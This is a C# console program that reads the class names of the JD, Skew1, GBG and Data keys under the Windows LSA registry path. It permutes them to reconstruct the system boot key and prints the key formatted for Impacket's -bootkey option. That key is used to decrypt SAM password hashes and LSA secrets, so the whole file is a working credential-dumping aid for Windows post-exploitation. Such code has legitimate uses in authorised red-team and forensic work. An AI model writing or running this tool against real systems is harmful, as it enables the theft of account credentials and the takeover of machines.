using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;

class BootKeyReader
{
    const int KEY_READ        = 0x20019;
    const int KEY_WOW64_64KEY = 0x0100;

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, int ulOptions, int samDesired, out IntPtr phkResult);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegQueryInfoKey(IntPtr hKey, StringBuilder lpClass, ref uint lpcbClass,
        IntPtr lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen, IntPtr lpcbMaxClassLen,
        IntPtr lpcValues, IntPtr lpcbMaxValueNameLen, IntPtr lpcbMaxValueLen,
        IntPtr lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern int RegCloseKey(IntPtr hKey);

    static readonly IntPtr HKEY_LOCAL_MACHINE = new IntPtr(unchecked((int)0x80000002));
    static readonly string[] Keys = { "JD", "Skew1", "GBG", "Data" };
    static readonly int[] Transforms = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };

    static string ReadClass(string subKey)
    {
        IntPtr h;
        int rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ | KEY_WOW64_64KEY, out h);
        if (rc != 0) throw new Win32Exception(rc);
        try
        {
            uint len = 256;
            StringBuilder sb = new StringBuilder((int)len);
            rc = RegQueryInfoKey(h, sb, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (rc != 0) throw new Win32Exception(rc);
            return sb.ToString().TrimEnd('\0');
        }
        finally { RegCloseKey(h); }
    }

    static int Main(string[] args)
    {
        try
        {
            string basePath = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
            string hex = "";
            foreach (string k in Keys)
            {
                string cls = ReadClass(basePath + k);
                if (cls.Length < 8)
                    throw new FormatException("class name for " + k + " too short: '" + cls + "'");
                cls = cls.Substring(0, 8);
                Console.WriteLine("{0,-5} : {1}", k, cls);
                hex += cls;
            }
            if (hex.Length != 32)
                throw new FormatException("expected 32 hex chars from the four class names, got " + hex.Length);

            byte[] raw = new byte[16];
            for (int i = 0; i < 16; i++) raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);

            byte[] boot = new byte[16];
            for (int i = 0; i < 16; i++) boot[i] = raw[Transforms[i]];

            StringBuilder outp = new StringBuilder(32);
            foreach (byte b in boot) outp.Append(b.ToString("x2"));

            Console.WriteLine("Boot Key: 0x" + outp.ToString());
            Console.WriteLine("Impacket -bootkey: " + outp.ToString() + "   (no 0x prefix)");
            return 0;
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("[-] " + ex.Message);
            return 1;
        }
    }
}
